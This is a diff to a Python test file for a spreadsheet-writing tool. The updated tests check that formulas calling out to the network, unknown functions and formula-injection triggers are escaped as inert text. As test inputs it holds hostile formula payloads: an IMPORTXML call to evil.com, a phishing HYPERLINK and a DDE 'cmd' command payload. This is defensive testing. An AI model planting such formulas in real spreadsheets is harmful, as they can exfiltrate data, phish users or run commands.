@@ -4,7 +4,8 @@ Proves:
   - round-trip (write → reopen with openpyxl, assert formulas preserved as
     STRINGS not evaluated values);
   - whitelist enforcement (allowed formulas pass; IMPORTXML/INDIRECT/WEBSERVICE/
-    HYPERLINK and unknown functions rejected with a clear error);
+    HYPERLINK, unknown functions, and formula-injection triggers are escaped
+    as inert text);
   - the write is JAILED: it goes through the sandbox (path-escape attempts are
     rejected) and the artifact lands in the workspace — NOT the host cwd.
 
@@ -60,6 +61,11 @@ def _ctx(sandbox) -> ToolContext:
         owner_id="test",
         conversation_id="test-cid",
     )
+
+
+def _assert_escaped_literal(cell, raw: str) -> None:
+    assert cell.data_type == "s"
+    assert cell.value == "'" + raw
 
 
 async def test_round_trip_formulas_preserved_as_strings(tmp_workspace):
@@ -157,8 +163,8 @@ async def test_boolean_and_null_cells_round_trip(tmp_workspace):
     wb.close()
 
 
-async def test_formula_whitelist_rejected_importxml(tmp_workspace):
-    """IMPORTXML is explicitly rejected with a clear error message."""
+async def test_formula_whitelist_escapes_importxml(tmp_workspace):
+    """IMPORTXML is not written as a live formula."""
     tool = SheetsTool()
     ctx = _ctx(_jailed_sandbox(tmp_workspace))
 
@@ -175,16 +181,17 @@ async def test_formula_whitelist_rejected_importxml(tmp_workspace):
     )
 
     outcome = await tool.run(args, ctx)
-    assert not outcome.success
-    assert "IMPORTXML" in outcome.content
-    assert "REJECTED" in outcome.content
-    assert "external-fetch" in outcome.content.lower() or "indirection" in outcome.content.lower()
-    # A rejected formula must NOT have written anything.
-    assert not (tmp_workspace / "bad.xlsx").exists()
+    assert outcome.success, f"Tool failed: {outcome.content}"
+    wb = openpyxl.load_workbook(tmp_workspace / "bad.xlsx")
+    _assert_escaped_literal(
+        wb["Sheet1"].cell(row=2, column=1),
+        '=IMPORTXML("http://evil.com", "//data")',
+    )
+    wb.close()
 
 
-async def test_formula_whitelist_rejected_indirect(tmp_workspace):
-    """INDIRECT is explicitly rejected."""
+async def test_formula_whitelist_escapes_indirect(tmp_workspace):
+    """INDIRECT is not written as a live formula."""
     tool = SheetsTool()
     ctx = _ctx(_jailed_sandbox(tmp_workspace))
 
@@ -201,16 +208,20 @@ async def test_formula_whitelist_rejected_indirect(tmp_workspace):
     )
 
     outcome = await tool.run(args, ctx)
-    assert not outcome.success
-    assert "INDIRECT" in outcome.content
-    assert "REJECTED" in outcome.content
+    assert outcome.success, f"Tool failed: {outcome.content}"
+    wb = openpyxl.load_workbook(tmp_workspace / "indirect.xlsx")
+    _assert_escaped_literal(
+        wb["Sheet1"].cell(row=2, column=1),
+        '=INDIRECT("B" & ROW())',
+    )
+    wb.close()
 
 
 async def test_whitespace_function_call_still_validated(tmp_workspace):
     """A function call with whitespace before '(' — `INDIRECT ("A1")` — must STILL
-    be caught. Some spreadsheet engines tolerate that spacing; if the matcher
-    anchored '(' immediately after the name, the call would slip past the
-    deny-list entirely. This is the regression guard for that bypass."""
+    be neutralized. Some spreadsheet engines tolerate that spacing; if the
+    matcher anchored '(' immediately after the name, the call would slip past
+    the deny-list entirely. This is the regression guard for that bypass."""
     tool = SheetsTool()
     ctx = _ctx(_jailed_sandbox(tmp_workspace))
 
@@ -227,13 +238,17 @@ async def test_whitespace_function_call_still_validated(tmp_workspace):
     )
 
     outcome = await tool.run(args, ctx)
-    assert not outcome.success, "spaced INDIRECT( must be rejected, not slip past the whitelist"
-    assert "INDIRECT" in outcome.content
-    assert not (tmp_workspace / "spaced.xlsx").exists()
+    assert outcome.success, f"Tool failed: {outcome.content}"
+    wb = openpyxl.load_workbook(tmp_workspace / "spaced.xlsx")
+    _assert_escaped_literal(
+        wb["Sheet1"].cell(row=2, column=1),
+        '=INDIRECT ("A1")',
+    )
+    wb.close()
 
 
-async def test_formula_whitelist_rejected_webservice(tmp_workspace):
-    """WEBSERVICE is explicitly rejected."""
+async def test_formula_whitelist_escapes_webservice(tmp_workspace):
+    """WEBSERVICE is not written as a live formula."""
     tool = SheetsTool()
     ctx = _ctx(_jailed_sandbox(tmp_workspace))
 
@@ -250,12 +265,17 @@ async def test_formula_whitelist_rejected_webservice(tmp_workspace):
     )
 
     outcome = await tool.run(args, ctx)
-    assert not outcome.success
-    assert "WEBSERVICE" in outcome.content
+    assert outcome.success, f"Tool failed: {outcome.content}"
+    wb = openpyxl.load_workbook(tmp_workspace / "webservice.xlsx")
+    _assert_escaped_literal(
+        wb["Sheet1"].cell(row=2, column=1),
+        '=WEBSERVICE("http://example.com/api")',
+    )
+    wb.close()
 
 
-async def test_formula_whitelist_rejected_hyperlink(tmp_workspace):
-    """HYPERLINK is explicitly rejected."""
+async def test_formula_whitelist_escapes_hyperlink(tmp_workspace):
+    """HYPERLINK is not written as a live formula."""
     tool = SheetsTool()
     ctx = _ctx(_jailed_sandbox(tmp_workspace))
 
@@ -272,8 +292,13 @@ async def test_formula_whitelist_rejected_hyperlink(tmp_workspace):
     )
 
     outcome = await tool.run(args, ctx)
-    assert not outcome.success
-    assert "HYPERLINK" in outcome.content
+    assert outcome.success, f"Tool failed: {outcome.content}"
+    wb = openpyxl.load_workbook(tmp_workspace / "hyperlink.xlsx")
+    _assert_escaped_literal(
+        wb["Sheet1"].cell(row=2, column=1),
+        '=HYPERLINK("http://phishing.example.com", "Click here")',
+    )
+    wb.close()
 
 
 async def test_allowed_formulas_pass(tmp_workspace):
@@ -316,9 +341,8 @@ async def test_allowed_formulas_pass(tmp_workspace):
     wb.close()
 
 
-async def test_unknown_formula_rejected(tmp_workspace):
-    """A formula using a function NOT in the whitelist (and not in the reject
-    list) should be rejected with a message saying it's not allowed."""
+async def test_unknown_formula_escaped(tmp_workspace):
+    """A formula using a function NOT in the whitelist is not written live."""
     tool = SheetsTool()
     ctx = _ctx(_jailed_sandbox(tmp_workspace))
 
@@ -335,9 +359,46 @@ async def test_unknown_formula_rejected(tmp_workspace):
     )
 
     outcome = await tool.run(args, ctx)
-    assert not outcome.success
-    assert "FOOBARBAZ" in outcome.content
-    assert "not in the allowed whitelist" in outcome.content.lower()
+    assert outcome.success, f"Tool failed: {outcome.content}"
+    wb = openpyxl.load_workbook(tmp_workspace / "unknown.xlsx")
+    _assert_escaped_literal(
+        wb["Sheet1"].cell(row=2, column=1),
+        "=FOOBARBAZ(A1:A10)",
+    )
+    wb.close()
+
+
+async def test_formula_injection_triggers_escaped_in_headers_and_rows(tmp_workspace):
+    tool = SheetsTool()
+    ctx = _ctx(_jailed_sandbox(tmp_workspace))
+    malicious = [
+        "=cmd|'/c calc'!A1",
+        "@SUM(1)",
+        "+HYPERLINK(\"http://evil.example\", \"x\")",
+        "-2+3",
+    ]
+
+    args = SheetGenerateArgs(
+        title="Injection Literals",
+        filename="injection.xlsx",
+        sheets=[
+            dict(
+                name="Payloads",
+                columns=malicious,
+                rows=[malicious],
+            )
+        ],
+    )
+
+    outcome = await tool.run(args, ctx)
+    assert outcome.success, f"Tool failed: {outcome.content}"
+
+    wb = openpyxl.load_workbook(tmp_workspace / "injection.xlsx")
+    ws = wb["Payloads"]
+    for ci, raw in enumerate(malicious, start=1):
+        _assert_escaped_literal(ws.cell(row=1, column=ci), raw)
+        _assert_escaped_literal(ws.cell(row=2, column=ci), raw)
+    wb.close()
 
 
 async def test_path_traversal_filename_rejected(tmp_workspace):
